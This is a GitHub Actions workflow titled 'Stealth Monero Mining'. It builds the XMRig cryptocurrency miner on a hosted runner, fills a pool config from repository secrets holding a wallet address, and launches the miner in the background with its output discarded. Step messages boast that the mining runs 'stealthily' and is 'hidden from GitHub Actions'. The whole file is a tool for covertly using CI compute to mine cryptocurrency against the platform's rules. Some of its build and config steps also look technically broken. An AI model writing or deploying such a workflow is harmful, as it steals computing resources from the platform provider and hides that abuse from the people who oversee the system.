name: Stealth Monero Mining

on:
  workflow_dispatch:

jobs:
  stealth-mining:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Environment
        run: |
          sudo apt-get update && sudo apt-get install -y build-essential git cmake libssl-dev

      - name: Install XMRig Miner
        run: |
          git clone https://github.com/xmrig/xmrig.git
          cd xmrig
          make
          sudo cp xmrig /usr/local/bin/xmrig

      - name: Generate Config File
        run: |
          echo "{
            \"pool\": [
              {
                \"url\": \"${{ secrets.MINING_POOL_URL }}\",
                \"user\": \"${{ secrets.MONERO_WALLET_ADDRESS }}.${{ secrets.WORKER_NAME }}\",
                \"pass\": \"x\"
              }
            ],
            \"cpu\": true
          }" > config.json

      - name: Start Stealth Mining
        run: |
          nohup xmrig -c config.json > /dev/null 2>&1 &

      - name: Wait for Mining to Start
        run: |
          echo "Mining started in background. It will run stealthily."

      - name: Keep Mining Running
        run: |
          sleep 10
          echo "Mining is running in the background and hidden from GitHub Actions."

      - name: Check if Mining is Running
        run: |
          ps aux | grep xmrig | grep -v grep
